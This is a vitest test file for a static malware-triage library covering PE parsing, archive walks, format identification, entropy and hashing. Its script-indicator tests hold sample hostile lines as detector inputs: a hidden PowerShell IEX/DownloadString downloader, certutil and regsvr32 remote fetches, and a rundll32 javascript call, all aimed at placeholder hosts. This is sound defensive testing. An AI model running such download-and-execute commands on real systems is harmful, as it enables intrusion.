/**
 * Static triage library tests — every binary is hand-crafted in test code
 * (no fixtures). Covers magic identification, entropy, PE structure/imports/
 * overlay, zip central-directory walks, embedded-PE scans, script
 * indicators, hashing vectors and the size guard.
 */
import { describe, it, expect } from 'vitest'
import JSZip from 'jszip'
import { computeEntropy, MAX_TRIAGE_BYTES, triageBytes } from '../../src/lib/static-triage'

// ─── Byte helpers ──────────────────────────────────────────────────────────

const ascii = (s: string): Uint8Array => {
  const out = new Uint8Array(s.length)
  for (let i = 0; i < s.length; i++) out[i] = s.charCodeAt(i) & 0xff
  return out
}

function concat(parts: Uint8Array[]): Uint8Array {
  const total = parts.reduce((n, p) => n + p.length, 0)
  const out = new Uint8Array(total)
  let off = 0
  for (const p of parts) {
    out.set(p, off)
    off += p.length
  }
  return out
}

/** Deterministic PRNG (mulberry32) so PE/overlay payloads are reproducible. */
function rng(seed: number): () => number {
  let s = seed >>> 0
  return () => {
    s = (s + 0x6d2b79f5) | 0
    let t = Math.imul(s ^ (s >>> 15), 1 | s)
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}

function randomBytes(len: number, seed = 0xc0ffee): Uint8Array {
  const out = new Uint8Array(len)
  const next = rng(seed)
  for (let i = 0; i < len; i++) out[i] = Math.floor(next() * 256) & 0xff
  return out
}

// ─── Minimal PE builder ───────────────────────────────────────────────────

const FILE_ALIGN = 0x200
const SECTION_ALIGN = 0x1000
const OPT_HEADER_SIZE = 240 // PE32+ fixed fields (112) + 16 data dirs × 8

interface PeSectionSpec {
  name: string
  virtSize?: number
  rawSize: number
  fill: 'zero' | 'nop' | 'random'
  chars?: number
}

interface PeOpts {
  machine?: number
  subsystem?: number
  dll?: boolean
  sections?: PeSectionSpec[]
  /** Synthesizes an .idata section with one import descriptor per DLL. */
  importDlls?: string[]
  /** Populates data directory 4 → hasDigitalSignature. */
  certDir?: { rva: number; size: number }
  overlayBytes?: Uint8Array
}

function makePe(opts: PeOpts = {}): Uint8Array {
  const machine = opts.machine ?? 0x8664
  const subsystem = opts.subsystem ?? 3 // console
  const timestamp = 0x65000000

  const specs: PeSectionSpec[] = opts.sections
    ? [...opts.sections]
    : [
        { name: '.text', rawSize: 0x200, fill: 'nop', chars: 0x60000020 },
        { name: 'UPX0', rawSize: 0x400, fill: 'random', chars: 0xe00000e0 },
      ]

  // Synthesize an .idata section when import DLLs are requested.
  let idataData: Uint8Array | undefined
  if (opts.importDlls && opts.importDlls.length > 0) {
    const dlls = opts.importDlls
    const k = dlls.length
    const descSize = (k + 1) * 20 // descriptors + terminator
    const thunkBase = descSize
    const hintBase = thunkBase + k * 8
    const strBase = hintBase + k * 4
    const totalLen = strBase + dlls.reduce((n, d) => n + d.length + 1, 0)
    idataData = new Uint8Array(totalLen)
    const dv = new DataView(idataData.buffer)
    for (let i = 0; i < k; i++) {
      const descOff = i * 20
      const thunkRva = thunkBase + i * 8
      const hintRva = hintBase + i * 4
      const strOff = strBase + dlls.slice(0, i).reduce((n, d) => n + d.length + 1, 0)
      dv.setUint32(descOff, thunkRva, true) // OriginalFirstThunk
      dv.setUint32(descOff + 12, strOff, true) // Name RVA
      dv.setUint32(descOff + 16, thunkRva, true) // FirstThunk
      dv.setUint32(thunkOff(thunkBase, i), hintRva, true) // thunk → hint/name
      // hint (2 bytes zero) + minimal name byte
      idataData[hintOff(hintBase, i) + 3] = 0x41 // 'A' after 2-byte zero hint
      const dll = dlls[i]
      if (dll !== undefined) idataData.set(ascii(dll), strOff)
    }
    function thunkOff(base: number, i: number): number {
      return base + i * 8
    }
    function hintOff(base: number, i: number): number {
      return base + i * 4
    }
  }
  if (idataData) {
    specs.push({ name: '.idata', rawSize: alignUp(idataData.length), fill: 'zero' })
  }

  const numSections = specs.length
  const headersRaw =
    0x40 + 4 + 20 + OPT_HEADER_SIZE + numSections * 40
  const headersSize = alignUp(headersRaw)

  // Layout: VAs start at 0x1000; raw pointers right after the header block.
  interface LaidOut extends PeSectionSpec {
    va: number
    rawPtr: number
    data: Uint8Array
  }
  const laid: LaidOut[] = []
  let cursor = headersSize
  specs.forEach((spec, i) => {
    let payload: Uint8Array
    if (spec.name === '.idata' && idataData) {
      payload = padTo(idataData, spec.rawSize)
    } else if (spec.fill === 'random') {
      payload = randomBytes(spec.rawSize, 0xbeef + i)
    } else if (spec.fill === 'nop') {
      payload = new Uint8Array(spec.rawSize).fill(0x90)
    } else {
      payload = new Uint8Array(spec.rawSize)
    }
    laid.push({
      ...spec,
      va: SECTION_ALIGN * (i + 1),
      rawPtr: cursor,
      data: payload,
    })
    cursor += spec.rawSize
  })

  const fileSize = cursor + (opts.overlayBytes?.length ?? 0)
  const buf = new Uint8Array(fileSize)
  const dv = new DataView(buf.buffer)

  // DOS header: 'MZ' + e_lfanew = 0x40.
  buf[0] = 0x4d
  buf[1] = 0x5a
  dv.setUint32(0x3c, 0x40, true)

  // PE signature.
  buf.set(ascii('PE\0\0'), 0x40)

  // COFF header.
  const coff = 0x44
  dv.setUint16(coff, machine, true)
  dv.setUint16(coff + 2, numSections, true)
  dv.setUint32(coff + 4, timestamp, true)
  dv.setUint32(coff + 12, 0, true) // symbol table pointer/count = 0
  dv.setUint16(coff + 16, OPT_HEADER_SIZE, true)
  dv.setUint16(coff + 18, 0x0022 | (opts.dll ? 0x2000 : 0), true)

  // Optional header (PE32+).
  const opt = coff + 20
  dv.setUint16(opt, 0x20b, true)
  buf[opt + 2] = 14 // major linker version
  dv.setUint32(opt + 16, 0x1000, true) // AddressOfEntryPoint
  dv.setUint32(opt + 24, 0x140000000 % 0x100000000, true) // ImageBase lo
  dv.setUint32(opt + 28, Math.floor(0x140000000 / 0x100000000), true) // ImageBase hi
  dv.setUint32(opt + 32, SECTION_ALIGN, true)
  dv.setUint32(opt + 36, FILE_ALIGN, true)
  dv.setUint32(opt + 56, alignUp(cursor, SECTION_ALIGN), true) // SizeOfImage
  dv.setUint32(opt + 60, headersSize, true) // SizeOfHeaders
  dv.setUint16(opt + 68, subsystem, true)
  dv.setUint32(opt + 108, 16, true) // NumberOfRvaAndSizes

  // Data directories.
  const dirs = opt + 112
  if (opts.certDir) {
    dv.setUint32(dirs + 8 * 4, opts.certDir.rva, true)
    dv.setUint32(dirs + 8 * 4 + 4, opts.certDir.size, true)
  }
  const idataSection = laid.find((s) => s.name === '.idata')
  if (idataSection && opts.importDlls?.length) {
    dv.setUint32(dirs + 8 * 1, idataSection.va, true) // import dir RVA
    dv.setUint32(dirs + 8 * 1 + 4, (opts.importDlls.length + 1) * 20, true)
  }

  // Section headers.
  const secTable = opt + OPT_HEADER_SIZE
  laid.forEach((s, i) => {
    const entry = secTable + i * 40
    buf.set(ascii(s.name).subarray(0, 8), entry)
    dv.setUint32(entry + 8, s.virtSize ?? s.rawSize, true)
    dv.setUint32(entry + 12, s.va, true)
    dv.setUint32(entry + 16, s.rawSize, true)
    dv.setUint32(entry + 20, s.rawPtr, true)
    dv.setUint32(entry + 36, s.chars ?? 0x40000040, true)
  })

  // Section payloads + overlay.
  for (const s of laid) buf.set(s.data, s.rawPtr)
  if (opts.overlayBytes) buf.set(opts.overlayBytes, cursor)

  return buf
}

function alignUp(n: number, alignment = FILE_ALIGN): number {
  return Math.ceil(n / alignment) * alignment
}

function padTo(data: Uint8Array, size: number): Uint8Array {
  if (data.length >= size) return data.subarray(0, size)
  const out = new Uint8Array(size)
  out.set(data)
  return out
}

// ─── Entropy ───────────────────────────────────────────────────────────────

describe('computeEntropy', () => {
  it('returns 0 for constant bytes', () => {
    expect(computeEntropy(new Uint8Array(1024))).toBe(0)
  })

  it('returns ~1 bit/byte for uniform two-symbol input', () => {
    const buf = new Uint8Array(4096)
    for (let i = 0; i < buf.length; i++) buf[i] = i % 2 ? 0xaa : 0x55
    expect(Math.abs(computeEntropy(buf) - 1)).toBeLessThan(0.01)
  })
})

// ─── Hashing ───────────────────────────────────────────────────────────────

describe('hashing', () => {
  it('produces known md5/sha1/sha256 digests for "hello"', async () => {
    const res = await triageBytes(ascii('hello'))
    expect(res.md5).toBe('5d41402abc4b2a76b9719d911017c592')
    expect(res.sha1).toBe('aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d')
    expect(res.sha256).toBe(
      '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824'
    )
  })
})

// ─── PE core ───────────────────────────────────────────────────────────────

describe('PE parsing', () => {
  it('identifies family, machine, sections, UPX signals and sha256 shape', async () => {
    const res = await triageBytes(makePe())
    expect(res.fileType.family).toBe('pe')
    expect(res.mimeHint).toBe('application/vnd.microsoft.portable-executable')
    expect(res.pe?.machine).toBe('x64')
    expect(res.pe?.isDLL).toBe(false)
    expect(res.pe?.sections.map((s) => s.name)).toEqual(['.text', 'UPX0'])
    expect(res.pe?.sections[1]?.entropy).toBeGreaterThan(7)
    const names = res.packerSignals.map((p) => p.name)
    expect(names).toContain('UPX')
    expect(names).toContain('high_entropy_sections')
    expect(res.sha256).toMatch(/^[0-9a-f]{64}$/)
    expect(res.entropy.perSection?.map((p) => p.name)).toEqual(['.text', 'UPX0'])
  })

  it('decodes x86 machine type and DLL/driver flags', async () => {
    const exe86 = await triageBytes(makePe({ machine: 0x14c }))
    expect(exe86.pe?.machine).toBe('x86')

    const drv = await triageBytes(
      makePe({ subsystem: 1, dll: true, sections: [{ name: 'PAGE', rawSize: 0x200, fill: 'nop' }] })
    )
    expect(drv.pe?.isDLL).toBe(true)
    expect(drv.pe?.isDriver).toBe(true)
  })

  it('walks the import directory and fires few_imports without kernel32 escalation', async () => {
    const res = await triageBytes(makePe({ importDlls: ['KERNEL32.dll'] }))
    expect(res.pe?.importsSummary).toEqual(['KERNEL32.dll'])
    const names = res.packerSignals.map((p) => p.name)
    expect(names).toContain('few_imports')
    expect(names).not.toContain('low_imports_no_kernel32')
  })

  it('escalates to low_imports_no_kernel32 (high) when kernel32 is absent', async () => {
    const res = await triageBytes(makePe({ importDlls: ['USER32.dll', 'WS2_32.dll'] }))
    const signal = res.packerSignals.find((p) => p.name === 'low_imports_no_kernel32')
    expect(signal?.severity).toBe('high')
    expect(res.packerSignals.map((p) => p.name)).toContain('few_imports')
  })

  it('flags virtual >> raw mismatch and reports digital signature dir', async () => {
    const res = await triageBytes(
      makePe({
        certDir: { rva: 0x1000, size: 0x800 },
        sections: [{ name: '.text', rawSize: 0x200, virtSize: 0x8000, fill: 'nop' }],
      })
    )
    expect(res.notes.some((n) => n.includes('virtual size far exceeds raw size'))).toBe(true)
    expect(res.pe?.hasDigitalSignature).toBe(true)
  })

  it('detects the overlay, its size and high overlay entropy', async () => {
    const overlay = randomBytes(80 * 1024, 0xfeed)
    const bytes = makePe({
      sections: [{ name: '.text', rawSize: 0x200, fill: 'nop' }],
      overlayBytes: overlay,
    })
    const res = await triageBytes(bytes)
    expect(res.pe?.overlayOffset).toBe(bytes.byteLength - overlay.length)
    expect(res.pe?.overlaySize).toBe(overlay.length)
    expect(res.packerSignals.map((p) => p.name)).toContain('overlay_high_entropy')
    expect(res.notes.some((n) => n.startsWith('overlay present:'))).toBe(true)
  })

  it('notes an MZ header with invalid PE signature instead of failing', async () => {
    const bytes = concat([ascii('MZ'), new Uint8Array(62)])
    const res = await triageBytes(bytes)
    expect(res.fileType.family).toBe('unknown')
    expect(res.fileType.detail).toContain('dos-mz')
    expect(res.notes.some((n) => n.includes('PE signature invalid'))).toBe(true)
  })
})

// ─── Archives ──────────────────────────────────────────────────────────────

describe('zip archives', () => {
  it('lists members of a plain zip', async () => {
    const zip = new JSZip()
    zip.file('hello.txt', 'hello')
    const bytes = await zip.generateAsync({ type: 'uint8array', compression: 'STORE' })
    const res = await triageBytes(bytes)
    expect(res.fileType.family).toBe('zip')
    expect(res.zipMembers).toEqual([{ name: 'hello.txt', size: 5 }])
  })

  it('detects a nested zip member as an embedded artifact', async () => {
    const innerZip = new JSZip()
    innerZip.file('a.txt', 'aa')
    const inner = await innerZip.generateAsync({ type: 'uint8array', compression: 'STORE' })
    const outer = new JSZip()
    outer.file('inner.zip', inner)
    const bytes = await outer.generateAsync({ type: 'uint8array', compression: 'STORE' })
    const res = await triageBytes(bytes)
    expect(res.fileType.family).toBe('zip')
    const nested = res.embeddedArtifacts.find((a) => a.kind === 'nested_zip')
    // jszip writes the first member's local header at file offset 0.
    expect(nested?.offset ?? -1).toBeGreaterThanOrEqual(0)
    expect(nested?.note).toContain('inner.zip')
  })

  it('promotes zips containing [Content_Types].xml to ooxml', async () => {
    const zip = new JSZip()
    zip.file('[Content_Types].xml', '<?xml version="1.0"?><Types/>')
    zip.file('word/document.xml', '<doc/>')
    const bytes = await zip.generateAsync({ type: 'uint8array', compression: 'DEFLATE' })
    const res = await triageBytes(bytes)
    expect(res.fileType.family).toBe('ooxml')
    expect(res.fileType.detail).toContain('[Content_Types].xml')
    expect(res.zipMembers?.map((m) => m.name)).toContain('word/document.xml')
  })
})

// ─── Other formats ─────────────────────────────────────────────────────────

describe('format identification', () => {
  it('identifies PDF by header', async () => {
    const res = await triageBytes(concat([ascii('%PDF-1.7\n'), randomBytes(64)]))
    expect(res.fileType.family).toBe('pdf')
    expect(res.mimeHint).toBe('application/pdf')
  })

  it('identifies RTF', async () => {
    const res = await triageBytes(ascii('{\\rtf1\\ansi Hello}'))
    expect(res.fileType.family).toBe('rtf')
    expect(res.mimeHint).toBe('application/rtf')
  })

  it('identifies ELF', async () => {
    const bytes = concat([new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1]), new Uint8Array(32)])
    const res = await triageBytes(bytes)
    expect(res.fileType.family).toBe('elf')
    expect(res.fileType.detail).toBe('elf64')
  })

  it('identifies Mach-O (64-bit LE magic)', async () => {
    const bytes = concat([new Uint8Array([0xcf, 0xfa, 0xed, 0xfe]), new Uint8Array(32)])
    const res = await triageBytes(bytes)
    expect(res.fileType.family).toBe('macho')
  })

  it('identifies pcap in both endian magics and pcapng', async () => {
    const pcapLE = await triageBytes(concat([new Uint8Array([0xd4, 0xc3, 0xb2, 0xa1, 2, 0, 4, 0]), new Uint8Array(16)]))
    expect(pcapLE.fileType.family).toBe('pcap')
    expect(pcapLE.fileType.detail).toBe('little-endian')

    const pcapBE = await triageBytes(concat([new Uint8Array([0xa1, 0xb2, 0xc3, 0xd4, 0, 2, 0, 4]), new Uint8Array(16)]))
    expect(pcapBE.fileType.family).toBe('pcap')
    expect(pcapBE.fileType.detail).toBe('big-endian')

    const pcapng = await triageBytes(concat([new Uint8Array([0x0a, 0x0d, 0x0d, 0x0a]), new Uint8Array(16)]))
    expect(pcapng.fileType.family).toBe('pcapng')
  })

  it('classifies OLE compound documents as unknown family + ole_cdf artifact', async () => {
    const bytes = concat([
      new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]),
      new Uint8Array(64),
    ])
    const res = await triageBytes(bytes)
    expect(res.fileType.family).toBe('unknown')
    expect(res.fileType.detail).toContain('ole-cdf')
    expect(res.embeddedArtifacts[0]?.kind).toBe('ole_cdf')
    expect(res.embeddedArtifacts[0]?.offset).toBe(0)
  })

  it('falls back to unknown for short binary noise', async () => {
    const res = await triageBytes(new Uint8Array([0x01, 0x00, 0x02, 0x00, 0xfe]))
    expect(res.fileType.family).toBe('unknown')
    expect(res.mimeHint).toBe('application/octet-stream')
  })

  it('notes high overall entropy on crypto-random input', async () => {
    const buf = new Uint8Array(4096)
    crypto.getRandomValues(buf)
    const res = await triageBytes(buf)
    expect(res.entropy.overall).toBeGreaterThan(7.4)
    expect(res.notes.some((n) => n.includes('entropy') && n.includes('high'))).toBe(true)
  })
})

// ─── Script indicators ─────────────────────────────────────────────────────

describe('script indicators', () => {
  it('fires powershell -enc / -w hidden / IEX / DownloadString', async () => {
    const sample = [
      '# obfuscated downloader',
      'powershell -enc SQBFAFgA -w hidden',
      '$wc = New-Object Net.WebClient',
      'IEX($wc.DownloadString("http://example.test/p"))',
    ].join('\n')
    const res = await triageBytes(ascii(sample))
    expect(res.fileType.family).toBe('script')
    const ind = res.scriptIndicators
    expect(ind?.powershellEnc).toBe(true)
    expect(ind?.powershellHidden).toBe(true)
    expect(ind?.iex).toBe(true)
    expect(ind?.downloadString).toBe(true)
    expect(ind?.macroMarkers).toEqual([])
  })

  it('detects cmd /c, certutil, rundll32, regsvr32 and long base64 blobs', async () => {
    const blob = 'QQ'.repeat(300) // > 512 base64 chars
    const sample = `@echo off\r\ncmd /c certutil -urlcache -split -f http://x/a.exe a.exe\r\nrundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"\r\nregsvr32 /s /u /i:http://x scrobj.dll\r\necho ${blob}`
    const res = await triageBytes(ascii(sample))
    expect(res.fileType.family).toBe('script')
    const ind = res.scriptIndicators
    expect(ind?.cmdC).toBe(true)
    expect(ind?.certutil).toBe(true)
    expect(ind?.rundll32).toBe(true)
    expect(ind?.regsvr32).toBe(true)
    expect(ind?.longBase64).toBe(true)
  })

  it('reports shebang scripts with all indicators false', async () => {
    const res = await triageBytes(ascii('#!/bin/bash\necho done\n'))
    expect(res.fileType.family).toBe('script')
    expect(res.fileType.detail).toBe('shebang script')
    expect(res.scriptIndicators?.powershellEnc).toBe(false)
    expect(res.scriptIndicators?.certutil).toBe(false)
    expect(res.scriptIndicators?.macroMarkers).toEqual([])
  })

  it('matches Office macro markers case-insensitively', async () => {
    const sample = 'Sub autoopen()\nMsgBox "hi"\nEnd Sub\n'
    const res = await triageBytes(ascii(sample))
    expect(res.fileType.family).toBe('script')
    expect(res.scriptIndicators?.macroMarkers).toContain('AutoOpen')
  })
})

// ─── Embedded artifacts + guard ────────────────────────────────────────────

describe('embedded artifacts and guards', () => {
  it('finds a verified embedded PE beyond offset 0x200', async () => {
    const carrier = concat([randomBytes(0x300), makePe()])
    const res = await triageBytes(carrier)
    const hit = res.embeddedArtifacts.find((a) => a.kind === 'embedded_pe')
    expect(hit?.offset).toBe(0x300)
    expect(hit?.note).toContain('PE signature verified')
    expect(res.notes.some((n) => n.includes('embedded PE scan'))).toBe(true)
  })

  it('rejects inputs above MAX_TRIAGE_BYTES with "too large"', async () => {
    await expect(triageBytes(new Uint8Array(MAX_TRIAGE_BYTES + 1))).rejects.toThrow('too large')
  })
})
